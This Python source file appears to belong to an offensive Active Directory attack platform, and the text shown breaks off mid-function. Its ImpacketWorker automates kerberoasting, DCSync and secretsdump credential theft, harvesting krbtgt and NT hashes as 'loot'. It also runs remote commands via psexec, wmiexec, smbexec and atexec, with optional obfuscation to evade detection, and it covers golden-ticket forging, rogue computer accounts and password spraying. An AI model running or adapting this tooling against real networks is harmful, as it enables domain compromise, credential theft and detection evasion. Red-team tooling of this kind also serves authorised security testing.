from __future__ import annotations

import asyncio
import logging
import os
import re
import shlex
import shutil
import tempfile
from datetime import datetime, timezone
from typing import Callable, Awaitable

from adbygod_api.core.workers.base import ExecutorWorker
from adbygod_api.core.connectivity.transport import ProxyTransport

log = logging.getLogger(__name__)

SUPPORTED_TECHNIQUES = {
    "kerberoast",
    "asreproast",
    "dcsync",
    "secretsdump",
    "smbexec",
    "wmiexec",
    "atexec",
    "psexec",
    "echo_test",
    "getst",
    "getTGT",
    "getnpusers",
    "getuserspns",
    "lookupsid",
    "samrdump",
    "ticketer",
    "manual_crack",
    # new techniques
    "ldap_enum",
    "smb_enum",
    "rpcdump",
    "reg_query",
    "services_enum",
    "find_delegation",
    "addcomputer",
    "nmap_scan",
    "password_spray_smb",
    "netview",
    "dacledit",
    "changepasswd",
    # network posture checks
    "smb_signing_check",
    "llmnr_nbtns_check",
    "ntlm_config_check",
    "ldap_signing_check",
    "winrm_check",
    "open_shares_check",
    "cred_manager_check",
    "kerberoast_spn_enum",
    # path-to-DA techniques
    "zerologon",
    "zerologon_restore",
    "certipy_find",
    "certipy_req",
    "certipy_auth",
    "certipy_template",
    "coerce",
    "ntlmrelayx",
    "ntlmrelayx_adcs",
    "whisker",
    "gmsa_dump",
    "rbcd_write",
    "renamemachine",
    "laps_dump",
    "gpo_enum",
    "gpo_inject",
    "acl_enum",
    "delegation_enum",
    "user_enum",
    "password_spray",
    "password_reset",
    "rubeus_monitor",
    "sccm_enum",
    "sccm_naa",
    # credential dump
    "cred_dump_lsass",
    "cred_dump_ntds_vss",
    "cred_dump_secretsdump",
    "dpapi_backup_key",
    "dpapi_sharpdpapi",
    # PKI / golden cert
    "certipy_ca_backup",
    "certipy_forge",
    "certipy_unpac",
    "passthe_cert",
    # WMI / COM persistence
    "wmi_subscription",
    "com_hijack",
    "dcom_exec",
    # cloud assessment (reference commands, output guidance)
    "cloud_entra_enum",
    "cloud_adfs_enum",
    "cloud_m365_enum",
}


def _ts() -> str:
    return datetime.now(timezone.utc).isoformat()


def _secure_output_file(prefix: str) -> str:
    """Create a private temp output path for tools that insist on -outputfile.

    Do not accept a caller-supplied path here: these files are deleted after the
    job. Letting API params choose the path turns cleanup into an arbitrary file
    unlink primitive and may also leak contents from attacker-chosen files.
    """
    fd, path = tempfile.mkstemp(prefix=f"adbygod_{prefix}_", suffix=".txt")
    os.close(fd)
    return path


_SECRET_FLAGS = {"-p", "-P", "-H", "-hashes", "-altpass", "-newpass", "-computer-pass"}
_MAX_SPRAY_USERS = 2000
_NMAP_BLOCKED_FLAGS = {
    "-iL", "-oA", "-oG", "-oN", "-oS", "-oX",
    "--append-output", "--datadir", "--exclude-file", "--resume",
    "--script", "--script-args", "--script-args-file", "--stylesheet",
}


def _safe_nmap_flags(flags: str) -> list[str]:
    try:
        argv = shlex.split(str(flags or ""), posix=True)
    except ValueError as exc:
        raise ValueError(f"Invalid nmap flags: {exc}") from exc
    if len(argv) > 32:
        raise ValueError("Too many nmap flags")
    for arg in argv:
        if any(ch in arg for ch in ("\0", "\r", "\n")):
            raise ValueError("nmap flags must not contain control characters")
        opt = arg.split("=", 1)[0]
        if opt in _NMAP_BLOCKED_FLAGS or opt.startswith("-o"):
            raise ValueError(f"nmap flag {opt!r} is not allowed")
    return argv



def _redact_token(token: str) -> str:
    if not token:
        return token
    if "\0" in token:
        return "<redacted>"
    if "@" in token and ":" in token.rsplit("@", 1)[0]:
        principal, host = token.rsplit("@", 1)
        user, _secret = principal.split(":", 1)
        return f"{user}:<redacted>@{host}"
    # Impacket commonly accepts credentials as DOMAIN/user:password without an
    # @host suffix.  The old redactor missed this form and leaked passwords to
    # job history/SSE via the "Running:" line.
    if ":" in token:
        principal, _secret = token.rsplit(":", 1)
        if "/" in principal or "\\" in principal:
            return f"{principal}:<redacted>"
    if token.startswith(":") and re.fullmatch(r":[A-Fa-f0-9]{32,}", token):
        return ":<redacted>"
    if re.fullmatch(r"[A-Fa-f0-9]{32}(:[A-Fa-f0-9]{32})?", token):
        return "<redacted-hash>"
    return token


def _display_cmd(cmd: list[str]) -> str:
    safe: list[str] = []
    redact_next = False
    for token in cmd:
        if redact_next:
            safe.append("<redacted>")
            redact_next = False
            continue
        safe.append(_redact_token(token))
        if token in _SECRET_FLAGS:
            redact_next = True
    return " ".join(shlex.quote(part) for part in safe)


def _certipy_user(username: str, domain: str) -> str:
    if "\\" in username:
        account = username.split("\\", 1)[1]
        return f"{account}@{domain}" if domain else account
    if "@" in username:
        return username
    return f"{username}@{domain}" if domain else username


def _domain_account(username: str) -> str:
    if "\\" in username:
        return username.split("\\", 1)[1]
    if "@" in username:
        return username.split("@", 1)[0]
    return username


class ImpacketWorker(ExecutorWorker):
    """Execute impacket-backed offensive techniques via subprocess.

    Pipeline obfuscation:
        params["obfuscation_enabled"]   → bool
        params["obfuscation_technique"] → int 0-13 or "auto"

    When obfuscation is enabled, PS one-liners sent via PS_REMOTE techniques
    (wmiexec, smbexec, psexec, atexec) are wrapped through ObfscTransformer
    before being passed to impacket.  The OutputNormalizer strips artefacts
    from the captured output.
    """

    def __init__(self, proxy_transport: ProxyTransport | None = None):
        self._proxy = proxy_transport

    def _make_transformer(self, params: dict):
        from adbygod_api.core.pipeline import ObfscTransformer, OutputNormalizer
        enabled = bool(params.get("obfuscation_enabled", False))
        technique = params.get("obfuscation_technique", "auto")
        transformer = ObfscTransformer(default_technique=technique) if enabled else None
        normalizer = OutputNormalizer() if enabled else None
        return transformer, normalizer

    def _obfsc_ps(
        self,
        cmd: str,
        transformer,
    ) -> str:
        """Wrap a PS one-liner through ObfscTransformer if active."""
        if transformer is None:
            return cmd
        try:
            return transformer.obfuscate_oneliner(cmd, remote_safe=True)
        except Exception:
            log.warning("[impacket] obfsc failed for cmd, using raw", exc_info=True)
            return cmd

    async def execute(
        self,
        job_id: str,
        params: dict,
        emit: Callable[[dict], Awaitable[None]],
    ) -> int:
        technique = params.get("technique", "")
        if technique not in SUPPORTED_TECHNIQUES:
            await emit({"stream": "stderr", "error": True, "line": f"[!] Unknown technique: {technique}", "ts": _ts()})
            return 1

        # ── Pipeline: build transformer + normalizer from params ──────
        transformer, normalizer = self._make_transformer(params)
        if transformer is not None:
            await emit({"stream": "stdout", "line": f"[OBFSC] technique={params.get('obfuscation_technique','auto')} active", "ts": _ts()})
        # Attach to params so individual handlers can access without signature changes
        params["_transformer"] = transformer
        params["_normalizer"] = normalizer

        handler = getattr(self, f"_run_{technique.replace('-', '_')}", None)
        if handler is None:
            await emit({"stream": "stderr", "error": True, "line": f"[!] Technique {technique} not yet implemented", "ts": _ts()})
            return 1

        return await handler(job_id, params, emit)

    async def _stream_subprocess(
        self,
        cmd: list[str],
        emit: Callable[[dict], Awaitable[None]],
        env: dict | None = None,
        cwd: str | None = None,
    ) -> int:
        await emit({"stream": "stdout", "line": f"[*] Running: {_display_cmd(cmd)}", "ts": _ts()})
        _env = self._proxy.subprocess_env(env) if self._proxy else env
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            env=_env,
            cwd=cwd,
        )
        try:
            if proc.stdin and not proc.stdin.is_closing():
                try:
                    proc.stdin.write(b"n\n")
                    await proc.stdin.drain()
                    proc.stdin.close()
                except (BrokenPipeError, ConnectionResetError):
                    pass

            async def drain(stream, stream_name: str):
                assert stream is not None
                async for raw in stream:
                    line = raw.decode("utf-8", errors="replace").rstrip()
                    if line:
                        await emit({"stream": stream_name, "line": line, "ts": _ts()})

            await asyncio.gather(
                drain(proc.stdout, "stdout"),
                drain(proc.stderr, "stderr"),
            )
            await proc.wait()
            return proc.returncode or 0
        except asyncio.CancelledError:
            if proc.returncode is None:
                proc.terminate()
                try:
                    await asyncio.wait_for(proc.wait(), timeout=3)
                except asyncio.TimeoutError:
                    proc.kill()
                    await proc.wait()
            raise

    async def _stream_subprocess_capture(
        self,
        cmd: list[str],
        emit: Callable[[dict], Awaitable[None]],
        env: dict | None = None,
        cwd: str | None = None,
    ) -> tuple[int, list[str]]:
        """Like _stream_subprocess but also returns all output lines."""
        captured: list[str] = []
        async def capturing_emit(data: dict) -> None:
            if data.get("line"):
                captured.append(data["line"])
            await emit(data)
        rc = await self._stream_subprocess(cmd, capturing_emit, env, cwd=cwd)
        return rc, captured

    async def _get_domain_sid(self, domain: str, username: str, password: str, hashes: str, dc_ip: str) -> str:
        """Fetch domain SID via impacket-lookupsid. Returns SID string or empty."""
        import re
        if hashes:
            nt = hashes.split(":")[-1] if ":" in hashes else hashes
            creds = f"{domain}/{username}"
            auth = ["-hashes", f":{nt}"]
        else:
            creds = f"{domain}/{username}:{password}"
            auth = []
        lines: list[str] = []
        proc = await asyncio.create_subprocess_exec(
            "impacket-lookupsid", creds, *auth, f"{dc_ip}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            env=self._proxy.subprocess_env() if self._proxy else None,
        )
        stdout, _ = await proc.communicate()
        for line in stdout.decode("utf-8", errors="replace").splitlines():
            lines.append(line)
            # "Domain SID is: S-1-5-21-..."  or  "S-1-5-21-..." in output
            m = re.search(r"(S-1-5-21-[\d-]+)", line)
            if m:
                # Strip RID suffix if present (lookupsid may include -500 etc)
                sid = m.group(1)
                parts = sid.split("-")
                # Domain SID has 7 parts: S-1-5-21-X-Y-Z
                if len(parts) >= 7:
                    return "-".join(parts[:7])
                return sid
        return ""

    async def _run_kerberoast(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        dc_ip = params.get("dc_ip", target)
        output_file = _secure_output_file("kerberoast")

        if hashes:
            creds = f"{domain}/{username}"
            auth_extra = ["-hashes", hashes]
        else:
            creds = f"{domain}/{username}:{password}"
            auth_extra = []

        cmd = [
            "impacket-GetUserSPNs",
            creds,
            *auth_extra,
            "-dc-ip", dc_ip,
            "-request",
            "-outputfile", output_file,
        ]

        try:
            exit_code = await self._stream_subprocess(cmd, emit)

            if exit_code == 0:
                try:
                    with open(output_file) as f:
                        hashes_content = f.read()
                    if hashes_content.strip():
                        await emit({"stream": "stdout", "line": "[+] Kerberoast hashes captured", "ts": _ts()})
                        await emit({"stream": "loot", "loot_type": "kerberos_hash", "data": hashes_content, "ts": _ts()})
                except FileNotFoundError:
                    pass

            return exit_code
        finally:
            try:
                os.unlink(output_file)
            except OSError:
                pass

    async def _run_asreproast(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        dc_ip = params.get("dc_ip", target)
        output_file = _secure_output_file("asrep")
        usersfile = params.get("usersfile", "")

        if usersfile:
            user_args = ["-usersfile", usersfile, "-no-pass"]
            auth_str = f"{domain}/"
        elif username and password:
            user_args = ["-request", "-format", "hashcat"]
            auth_str = f"{domain}/{username}:{password}"
        else:
            user_args = ["-request", "-format", "hashcat", "-no-pass"]
            auth_str = f"{domain}/"

        cmd = [
            "impacket-GetNPUsers",
            auth_str,
            *user_args,
            "-dc-ip", dc_ip,
            "-outputfile", output_file,
        ]

        try:
            exit_code = await self._stream_subprocess(cmd, emit)

            if exit_code == 0:
                try:
                    with open(output_file) as f:
                        content = f.read()
                    if content.strip():
                        await emit({"stream": "loot", "loot_type": "asrep_hash", "data": content, "ts": _ts()})
                except FileNotFoundError:
                    pass

            return exit_code
        finally:
            try:
                os.unlink(output_file)
            except OSError:
                pass

    async def _run_dcsync(self, job_id: str, params: dict, emit) -> int:
        import re
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        dc_ip = params.get("dc_ip", target)
        just_dc_user = params.get("just_dc_user", "")

        if hashes:
            creds = f"{domain}/{username}@{dc_ip}"
            auth_extra = ["-hashes", hashes]
        else:
            creds = f"{domain}/{username}:{password}@{dc_ip}"
            auth_extra = []

        target_arg = ["-just-dc-user", just_dc_user] if just_dc_user else ["-just-dc"]

        cmd = [
            "impacket-secretsdump",
            creds,
            *auth_extra,
            *target_arg,
        ]

        rc, lines = await self._stream_subprocess_capture(cmd, emit)

        # Parse krbtgt NT hash — format: krbtgt:502:aad3b435...:NTHASH:::
        for line in lines:
            m = re.match(r"krbtgt:\d+:[a-f0-9]+:([a-f0-9]{32}):::", line.strip(), re.IGNORECASE)
            if m:
                krbtgt_hash = m.group(1)
                await emit({"stream": "loot", "loot_type": "krbtgt_hash", "data": krbtgt_hash, "ts": _ts()})
                await emit({"stream": "stdout", "line": f"[+] krbtgt NT hash captured → {krbtgt_hash[:8]}...", "ts": _ts()})
                break

        # Also capture all NT hashes (Administrator etc.) as nt_hashes loot
        nt_hashes = []
        for line in lines:
            m = re.match(r"(\w+):\d+:[a-f0-9]+:([a-f0-9]{32}):::", line.strip(), re.IGNORECASE)
            if m and m.group(2) != "31d6cfe0d16ae931b73c59d7e0c089c0":  # skip empty hash
                nt_hashes.append(line.strip())
        if nt_hashes:
            await emit({"stream": "loot", "loot_type": "nt_hashes", "data": "\n".join(nt_hashes), "ts": _ts()})

        return rc

    async def _run_secretsdump(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")

        if hashes:
            creds = f"{domain}/{username}@{target}"
            auth_extra = ["-hashes", hashes]
        else:
            creds = f"{domain}/{username}:{password}@{target}"
            auth_extra = []

        cmd = [
            "impacket-secretsdump",
            creds,
            *auth_extra,
        ]

        return await self._stream_subprocess(cmd, emit)

    async def _run_smbexec(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        command = params.get("command", "whoami")
        # OBFSC: wrap PS command before sending via SMB exec
        command = self._obfsc_ps(command, params.get("_transformer"))

        if hashes:
            creds = f"{domain}/{username}@{target}"
            auth_extra = ["-hashes", hashes]
        else:
            creds = f"{domain}/{username}:{password}@{target}"
            auth_extra = []

        cmd = ["impacket-smbexec", creds, *auth_extra, "-c", command]
        return await self._stream_subprocess(cmd, emit)

    async def _run_wmiexec(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        command = params.get("command", "whoami")
        # OBFSC: wrap PS command before WMI delivery
        command = self._obfsc_ps(command, params.get("_transformer"))

        if hashes:
            creds = f"{domain}/{username}@{target}"
            auth_extra = ["-hashes", hashes]
        else:
            creds = f"{domain}/{username}:{password}@{target}"
            auth_extra = []

        cmd = ["impacket-wmiexec", creds, *auth_extra, command]
        return await self._stream_subprocess(cmd, emit)

    async def _run_atexec(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        command = params.get("command", "whoami")
        # OBFSC: wrap PS command before scheduled-task delivery
        command = self._obfsc_ps(command, params.get("_transformer"))

        if hashes:
            creds = f"{domain}/{username}@{target}"
            auth_extra = ["-hashes", hashes]
        else:
            creds = f"{domain}/{username}:{password}@{target}"
            auth_extra = []

        cmd = ["impacket-atexec", creds, *auth_extra, command]
        return await self._stream_subprocess(cmd, emit)

    async def _run_getuserspns(self, job_id: str, params: dict, emit) -> int:
        return await self._run_kerberoast(job_id, params, emit)

    async def _run_getnpusers(self, job_id: str, params: dict, emit) -> int:
        return await self._run_asreproast(job_id, params, emit)

    async def _run_psexec(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        command = params.get("command", "whoami /all")
        # OBFSC: wrap PS command before psexec delivery
        command = self._obfsc_ps(command, params.get("_transformer"))

        if hashes:
            creds = f"{domain}/{username}@{target}"
            auth_extra = ["-hashes", hashes]
        else:
            creds = f"{domain}/{username}:{password}@{target}"
            auth_extra = []

        cmd = ["impacket-psexec", creds, *auth_extra, "-c", command]
        return await self._stream_subprocess(cmd, emit)

    async def _run_getTGT(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        dc_ip = params.get("dc_ip", target)

        if hashes:
            creds = f"{domain}/{username}"
            auth_extra = ["-hashes", hashes]
        else:
            creds = f"{domain}/{username}:{password}"
            auth_extra = []

        cmd = [
            "impacket-getTGT",
            creds,
            *auth_extra,
            "-dc-ip", dc_ip,
        ]
        return await self._stream_subprocess(cmd, emit)

    async def _run_lookupsid(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")

        if username:
            if hashes:
                auth_str = f"{domain}/{username}"
                extra = ["-hashes", hashes]
            else:
                auth_str = f"{domain}/{username}:{password}"
                extra = []
        else:
            auth_str = f"{domain}/"
            extra = []

        cmd = [
            "impacket-lookupsid",
            f"{auth_str}@{target}",
            *extra,
        ]
        return await self._stream_subprocess(cmd, emit)

    async def _run_samrdump(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")

        if username:
            if hashes:
                auth = ["-hashes", hashes]
                target_str = f"{domain}/{username}@{target}"
            else:
                auth = []
                target_str = f"{domain}/{username}:{password}@{target}"
        else:
            auth = []
            target_str = f"{domain}/@{target}"

        cmd = ["impacket-samrdump", *auth, target_str]
        return await self._stream_subprocess(cmd, emit)

    async def _run_ticketer(self, job_id: str, params: dict, emit) -> int:
        domain = params.get("domain", "")
        target = params.get("target", "")
        dc_ip = params.get("dc_ip", target)
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        domain_sid = params.get("domain_sid", "")
        nthash = params.get("nthash", params.get("krbtgt_hash", ""))
        target_user = params.get("target_user", "Administrator")

        if not domain_sid and dc_ip and domain:
            await emit({"stream": "stdout", "line": "[*] domain_sid not in params — fetching via lookupsid...", "ts": _ts()})
            domain_sid = await self._get_domain_sid(domain, username, password, hashes, dc_ip)
            if domain_sid:
                await emit({"stream": "stdout", "line": f"[+] domain_sid = {domain_sid}", "ts": _ts()})

        if not domain_sid or not nthash:
            missing = []
            if not domain_sid:
                missing.append("domain_sid")
            if not nthash:
                missing.append("krbtgt_hash/nthash")
            await emit({"stream": "stderr", "line": f"[!] ticketer missing: {', '.join(missing)} — run DCSync first", "ts": _ts()})
            return 1

        cmd = [
            "impacket-ticketer",
            "-nthash", nthash,
            "-domain-sid", domain_sid,
            "-domain", domain,
            target_user,
        ]
        rc = await self._stream_subprocess(cmd, emit)
        if rc == 0:
            ccache = f"{target_user}.ccache"
            await emit({"stream": "loot", "loot_type": "ccache", "data": ccache, "ts": _ts()})
            await emit({"stream": "stdout", "line": f"[+] Golden ticket saved → {ccache}", "ts": _ts()})
            await emit({"stream": "stdout", "line": f"[*] Use with: KRB5CCNAME={ccache} impacket-wmiexec -k -no-pass {domain}/{target_user}@{dc_ip}", "ts": _ts()})
        return rc

    async def _run_manual_crack(self, job_id: str, params: dict, emit) -> int:
        """Manual crack step — the chain runner pauses here; this is a no-op placeholder."""
        prompt = params.get("manual_prompt", "Manual cracking required — enter cracked password to continue.")
        lines = [
            "[*] === MANUAL STEP REQUIRED ===",
            "[*] This step requires offline hash cracking.",
            f"[*] {prompt}",
            "[*] Chain is now PAUSED — enter cracked credentials in the UI to resume.",
        ]
        for line in lines:
            await asyncio.sleep(0.1)
            await emit({"stream": "stdout", "line": line, "ts": _ts()})
        # Return special code 2 = "waiting for input"
        return 2

    async def _run_getst(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        spn = params.get("spn", "")
        impersonate = params.get("impersonate", "Administrator")
        dc_ip = params.get("dc_ip", target)

        if hashes:
            creds = f"{domain}/{username}"
            auth_extra = ["-hashes", hashes]
        else:
            creds = f"{domain}/{username}:{password}"
            auth_extra = []

        cmd = [
            "impacket-getST",
            "-spn", spn,
            "-impersonate", impersonate,
            "-dc-ip", dc_ip,
            *auth_extra,
            creds,
        ]

        return await self._stream_subprocess(cmd, emit)

    async def _run_echo_test(self, job_id: str, params: dict, emit) -> int:
        """Simulated technique for testing the full job pipeline without a real target."""
        target = params.get("target", "127.0.0.1")
        domain = params.get("domain", "lab.local")
        lines = [
            "[*] AdByG0d Offensive Engine — ECHO TEST MODE",
            f"[*] Target: {target}  Domain: {domain}",
            "[*] Technique: Kerberoast (simulated)",
            f"[*] Connecting to DC at {target}...",
            "[*] LDAP bind as ANONYMOUS — enumerating SPNs",
            f"[+] Found SPN: HTTP/webserver.{domain}  (user: svc_web)",
            f"[+] Found SPN: MSSQLSvc/db01.{domain}:1433  (user: svc_mssql)",
            f"[+] Found SPN: cifs/fileserver.{domain}  (user: svc_smb)",
            "[*] Requesting TGS tickets for 3 accounts...",
            f"[+] $krb5tgs$23$*svc_web*{domain}*HTTP/webserver.{domain}*$a3f8...TRUNCATED",
            f"[+] $krb5tgs$23$*svc_mssql*{domain}*MSSQLSvc/db01.{domain}:1433*$b7c2...TRUNCATED",
            f"[+] $krb5tgs$23$*svc_smb*{domain}*cifs/fileserver.{domain}*$d1e4...TRUNCATED",
            f"[*] Hashes saved → /tmp/kerberoast_{job_id[:8]}.txt",
            "[+] Roast complete — 3 hashes captured. Crack with: hashcat -m 13100",
        ]
        for line in lines:
            await asyncio.sleep(0.4)
            stream = "stdout" if not line.startswith("[!]") else "stderr"
            await emit({"stream": stream, "line": line, "ts": _ts()})
        return 0

    # ------------------------------------------------------------------ #
    #  NEW TECHNIQUES                                                       #
    # ------------------------------------------------------------------ #

    async def _run_ldap_enum(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        base_dn = params.get("base_dn", "DC=" + ",DC=".join(domain.split("."))) if domain else params.get("base_dn", "")
        dc_ip = params.get("dc_ip", target)

        queries = [
            ("Users",                "(objectClass=user)",                       "sAMAccountName"),
            ("Computers",            "(objectClass=computer)",                   "sAMAccountName,dNSHostName,operatingSystem"),
            ("Groups",               "(objectClass=group)",                      "sAMAccountName,description"),
            ("Kerberoastable",       "(&(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))", "sAMAccountName,servicePrincipalName"),
            ("AS-REP Roastable",     "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))", "sAMAccountName"),
            ("Unconstrained Deleg",  "(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))", "sAMAccountName,distinguishedName"),
            ("AdminCount=1",         "(&(objectClass=user)(adminCount=1))",      "sAMAccountName,distinguishedName"),
            ("Domain Controllers",   "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))", "sAMAccountName,dNSHostName"),
            ("GPOs",                 "(objectClass=groupPolicyContainer)",       "displayName,gPCFileSysPath"),
            ("Trusts",               "(objectClass=trustedDomain)",              "name,trustDirection,trustType"),
        ]

        for label, filt, attrs in queries:
            # never pass passwords on the CLI (visible in /proc)
            with tempfile.NamedTemporaryFile(mode="w", suffix=".ldappass", delete=False) as pf:
                pf.write(password)
                pass_file = pf.name
            try:
                cmd = [
                    "ldapsearch", "-x",
                    "-H", f"ldap://{dc_ip}:389",
                    "-D", f"{username}@{domain}",
                    "-y", pass_file,
                    "-b", base_dn,
                    filt,
                    *attrs.split(","),
                ]
                await emit({"stream": "stdout", "line": f"\n[*] Enumerating {label}...", "ts": _ts()})
                await self._stream_subprocess(cmd, emit)
            finally:
                try:
                    os.unlink(pass_file)
                except OSError:
                    pass

        await emit({"stream": "stdout", "line": "[+] LDAP enumeration complete.", "ts": _ts()})
        return 0

    async def _run_smb_enum(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")

        if hashes:
            smb_creds = f"{domain}/{username}@{target}"
            auth_extra = ["-hashes", hashes]
        else:
            smb_creds = f"{domain}/{username}:{password}@{target}"
            auth_extra = []

        for step, cmd in [
            ("Share listing", [
                "impacket-smbclient",
                smb_creds, *auth_extra,
                "-c", "shares",
            ]),
        ]:
            await emit({"stream": "stdout", "line": f"[*] SMB {step}...", "ts": _ts()})
            await self._stream_subprocess(cmd, emit)

        # smbmap-style listing via smbclient
        cmd2 = [
            "smbclient", "-L", f"//{target}/",
            "-U", f"{domain}/{username}%{password}",
            "-N" if not password else "",
        ]
        cmd2 = [c for c in cmd2 if c]
        await emit({"stream": "stdout", "line": "[*] smbclient share listing...", "ts": _ts()})
        await self._stream_subprocess(cmd2, emit)
        return 0

    async def _run_rpcdump(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")

        auth = ["-hashes", hashes] if hashes else []
        target_str = f"{domain}/{username}:{password}@{target}" if not hashes else f"{domain}/{username}@{target}"

        cmd = ["impacket-rpcdump", *auth, target_str]
        return await self._stream_subprocess(cmd, emit)

    async def _run_reg_query(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        key = params.get("key", r"HKLM\SYSTEM\CurrentControlSet\Control\Lsa")

        auth = ["-hashes", hashes] if hashes else []
        target_str = f"{domain}/{username}:{password}@{target}" if not hashes else f"{domain}/{username}@{target}"

        cmd = ["impacket-reg", *auth, target_str, "query", "-keyName", key, "-s"]
        return await self._stream_subprocess(cmd, emit)

    async def _run_services_enum(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")

        auth = ["-hashes", hashes] if hashes else []
        target_str = f"{domain}/{username}:{password}@{target}" if not hashes else f"{domain}/{username}@{target}"

        cmd = ["impacket-services", *auth, target_str, "list"]
        return await self._stream_subprocess(cmd, emit)

    async def _run_find_delegation(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        dc_ip = params.get("dc_ip", target)

        auth = ["-hashes", hashes] if hashes else []

        cmd = [
            "impacket-findDelegation",
            f"{domain}/{username}:{password}" if not hashes else f"{domain}/{username}",
            *auth,
            "-dc-ip", dc_ip,
        ]
        return await self._stream_subprocess(cmd, emit)

    async def _run_addcomputer(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        computer_name = params.get("computer_name", f"EVIL{job_id[:4].upper()}$")
        computer_pass = params.get("computer_pass", "C0mput3r!Pass")
        dc_ip = params.get("dc_ip", target)

        auth = ["-hashes", hashes] if hashes else ["-computer-pass", computer_pass]

        cmd = [
            "impacket-addcomputer",
            f"{domain}/{username}:{password}" if not hashes else f"{domain}/{username}",
            *auth,
            "-computer-name", computer_name,
            "-dc-ip", dc_ip,
        ]
        return await self._stream_subprocess(cmd, emit)

    async def _run_nmap_scan(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        ports = params.get("ports", "53,88,135,139,389,445,464,636,3268,3269,5985")
        flags = params.get("flags", "-sV -sC -T4 --open")

        if not shutil.which("nmap"):
            await emit({"stream": "stderr", "line": "[!] nmap not found in PATH", "ts": _ts()})
            return 1

        try:
            safe_flags = _safe_nmap_flags(flags)
        except ValueError as exc:
            await emit({"stream": "stderr", "error": True, "line": f"[!] {exc}", "ts": _ts()})
            return 1
        if not re.fullmatch(r"[0-9,-]+", str(ports)):
            await emit({"stream": "stderr", "error": True, "line": "[!] Invalid nmap ports; use digits, commas, and ranges only", "ts": _ts()})
            return 1

        cmd = ["nmap", *safe_flags, "-p", str(ports), target]
        return await self._stream_subprocess(cmd, emit)

    async def _run_password_spray_smb(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        userlist = params.get("userlist", "")
        password = params.get("password", "Password1")
        if not userlist:
            await emit({"stream": "stderr", "line": "[!] password_spray_smb requires 'userlist' param (newline-separated usernames)", "ts": _ts()})
            return 1

        users = [u.strip() for u in userlist.splitlines() if u.strip()]
        if len(users) > _MAX_SPRAY_USERS:
            await emit({"stream": "stderr", "error": True, "line": f"[!] Refusing to spray {len(users)} users; max is {_MAX_SPRAY_USERS}", "ts": _ts()})
            return 1
        await emit({"stream": "stdout", "line": f"[*] Spraying {len(users)} users with a redacted password", "ts": _ts()})

        hits = 0
        for user in users:
            cmd = [
                "impacket-smbclient",
                f"{domain}/{user}:{password}@{target}",
                "-c", "exit",
            ]
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                env=self._proxy.subprocess_env() if self._proxy else None,
            )
            stdout, stderr = await proc.communicate()
            out = (stdout + stderr).decode("utf-8", errors="replace")
            if "Sharename" in out or "share" in out.lower() or proc.returncode == 0:
